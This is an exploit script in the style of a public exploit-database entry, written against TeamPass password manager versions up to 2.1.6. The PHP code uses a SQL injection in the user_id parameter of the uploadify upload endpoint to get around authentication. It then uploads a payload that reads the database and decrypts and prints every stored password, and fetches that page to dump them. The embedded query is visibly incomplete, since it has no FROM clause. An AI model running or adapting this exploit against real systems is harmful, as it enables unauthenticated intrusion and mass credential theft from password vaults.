# Exploit Title: Teampass <= v2.1.6 : Unauthenticated Arbitrary File Upload + Export decrypt passwords
# Date: 2012-04-01
# Author: leviathan (vulnerability discovered by Simon Leblanc : <https://github.com/nilsteampassnet/TeamPass/issues/67#issuecomment-4870428>)
# Vendor or Software Link: https://github.com/nilsteampassnet/TeamPass
# Version: <= 2.1.6
# Category:: webapps
# Tested on: GNU/Linux with TeamPass 2.1.5 and TeamPass 2.1.6
# Demo site: 

// The vulnerable website
$base_url   = &#039;http://localhost&#039;;
$url_folder = &#039;/teampass&#039;;

// The content of the file which be uploaded
$hack_content = <<<EOF
<?php
\$base_path = __DIR__.&#039;/../&#039;; // the file will be upload in the files folder
include(\$base_path.&#039;includes/settings.php&#039;);
require_once(\$base_path.&#039;sources/main.functions.php&#039;);
require_once(\$base_path."sources/class.database.php");
\$db->connect();

// Get all accounts
\$rows = \$db->fetch_all_array("
	                   SELECT i.id AS id, i.restricted_to AS restricted_to, i.perso AS perso, i.label AS label, i.description AS description, i.pw AS pw, i.login AS login,
	                       l.date AS date,
	                       n.renewal_period AS renewal_period,
	                       k.rand_key
	                   ORDER BY i.label ASC, l.date DESC
                ");

foreach( \$rows as \$reccord ) {
  print_r(\$reccord);
  \$pw = decrypt(\$reccord[&#039;pw&#039;]); // decrypt password
  \$pw = substr(addslashes(\$pw), strlen(\$reccord[&#039;rand_key&#039;]));
  echo "<br />pass : ".\$pw."<br />";
  echo "<br />-------------------------------------------------<br />";
}

EOF
;

// Build hack file to send
$hack_filename = &#039;get_pass_teampass.php&#039;;
if (file_put_contents(__DIR__.DIRECTORY_SEPARATOR.$hack_filename, $hack_content) === false) {
  die(&#039;Impossible to save the hack file&#039;);
}


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $base_url.$url_folder.&#039;/includes/libraries/uploadify/uploadify.php?key_tempo=my_hack_key&user_id=&#039;.urlencode(&#039;0 UNION SELECT \&#039;my_hack_key\&#039;&#039;));
curl_setopt($curl, CURLOPT_POST, true);
$post = array(
&#039;Filedata&#039; => &#039;@&#039;.__DIR__.DIRECTORY_SEPARATOR.$hack_filename,
&#039;type_upload&#039; => &#039;import_items_from_csv&#039;,
&#039;folder&#039; => $url_folder.&#039;/files&#039;,
);
curl_setopt($curl, CURLOPT_POSTFIELDS, $post);

$response = curl_exec($curl);

// print the list of all account
echo file_get_contents($base_url.$url_folder.&#039;/files/&#039;.$hack_filename);



